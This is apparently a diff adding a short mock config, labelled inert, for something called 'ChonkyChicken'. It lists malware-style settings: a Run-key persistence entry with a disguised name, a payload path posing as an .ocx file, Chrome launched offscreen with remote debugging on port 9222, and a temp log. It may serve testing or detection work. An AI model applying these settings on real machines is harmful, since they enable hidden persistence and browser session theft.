@@ -1,0 +1,6 @@
+; ChonkyChicken staging config (mock, inert)
+persist = HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinComCtl
+payload = %LOCALAPPDATA%\Packages\mscomctl.ocx
+chrome  = --remote-debugging-port=9222 --user-data-dir=%LOCALAPPDATA%\cdp --window-position=-32000,-32000
+cdp     = 127.0.0.1:9222
+log     = %TEMP%\lg.txt
